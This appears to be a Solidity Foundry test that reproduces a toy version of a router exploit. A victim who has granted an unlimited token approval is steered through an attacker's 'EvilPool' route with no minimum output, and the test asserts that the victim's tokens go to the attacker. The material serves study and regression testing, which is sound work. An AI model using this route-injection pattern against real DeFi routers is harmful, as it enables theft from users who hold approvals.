// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    IERC20Mini,
    SushiLikeRouter,
    EvilPool
} from "../src/SushiRouter.sol";

contract ERC20MiniMock is IERC20Mini {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;

    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    uint256 public totalSupply;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external override returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "not allowed");
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        _transfer(from, to, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "insufficient");
        unchecked {
            balanceOf[from] -= amount;
            balanceOf[to] += amount;
        }
    }
}

contract SushiRouterToyTest is Test {
    ERC20MiniMock tokenIn;
    ERC20MiniMock tokenOut;
    SushiLikeRouter router;
    EvilPool evilPool;

    address victim = address(0x1);
    address attacker = address(0x2);

    function setUp() public {
        tokenIn = new ERC20MiniMock("TokenIn", "IN");
        tokenOut = new ERC20MiniMock("TokenOut", "OUT");

        router = new SushiLikeRouter();
        evilPool = new EvilPool(attacker);

        // Victim has some TokenIn
        tokenIn.mint(victim, 1_000 ether);
    }

    function test_SushiLikeRouteExploit() public {
        uint256 amountIn = 100 ether;

        // Victim approves router to spend their tokens
        vm.prank(victim);
        tokenIn.approve(address(router), type(uint256).max);

        uint256 victimBefore = tokenIn.balanceOf(victim);
        uint256 attackerBefore = tokenIn.balanceOf(attacker);

        // Attacker-crafted route pointing to EvilPool
        bytes memory route = abi.encode(address(evilPool));

        // Victim thinks they are swapping via legit pool, but route is malicious
        vm.prank(victim);
        router.processRoute(
            tokenIn,
            amountIn,
            tokenOut,
            0,          // minAmountOut = 0 => victim not protected
            victim,
            route
        );

        uint256 victimAfter = tokenIn.balanceOf(victim);
        uint256 attackerAfter = tokenIn.balanceOf(attacker);
        uint256 routerBalance = tokenIn.balanceOf(address(router));

        // Victim lost 100 IN
        assertEq(victimBefore - victimAfter, amountIn);

        // Attacker gained those 100 IN
        assertEq(attackerAfter - attackerBefore, amountIn);

        // Router holds nothing (EvilPool drained it)
        assertEq(routerBalance, 0);
    }
}
